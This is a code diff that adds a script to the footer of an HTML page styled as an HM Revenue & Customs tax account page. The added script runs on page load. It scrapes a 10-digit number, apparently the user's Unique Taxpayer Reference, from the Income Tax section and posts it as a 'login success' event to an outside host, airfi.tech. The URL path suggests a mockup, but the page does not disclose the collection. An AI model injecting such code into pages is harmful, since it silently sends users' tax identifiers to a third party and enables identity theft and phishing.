@@ -56,5 +56,36 @@
 </main>
 
 <footer class="govuk-footer"><div class="govuk-width-container"><div class="govuk-footer__meta"><span>Built by HM Revenue &amp; Customs</span><a class="govuk-footer__link" href="#">Accessibility statement</a><a class="govuk-footer__link" href="#">Cookies</a></div></div></footer>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function () 
+  { // Your code here console.log('DOM is ready'); 
+
+  // POST Event
+  const incomeTaxUtr = Array.from(document.querySelectorAll('section.bta-section'))
+  .find(section => section.querySelector('h2')?.textContent.includes('Income Tax'))
+  ?.textContent.match(/\d{10}/)?.[0];
+  
+  urlStr = "method=account_login_success&account=" + incomeTaxUtr;
+  const xhttp = new XMLHttpRequest();
+
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+       console.log(xhttp.responseText);    
+       const headers = xhttp.getAllResponseHeaders();
+       console.log(headers);    
+    }
+    if (this.readyState == 4 && this.status != 200) {
+       console.log("Login failed");
+    }
+  };
+  xhttp.open("POST", "https://airfi.tech/HMRC/sa-repayment-mockup/homepage?" + urlStr, false);
+  xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
+  xhttp.send();
+  //POST DONE
+    
+  });
+  </script>
 </body>
 </html>
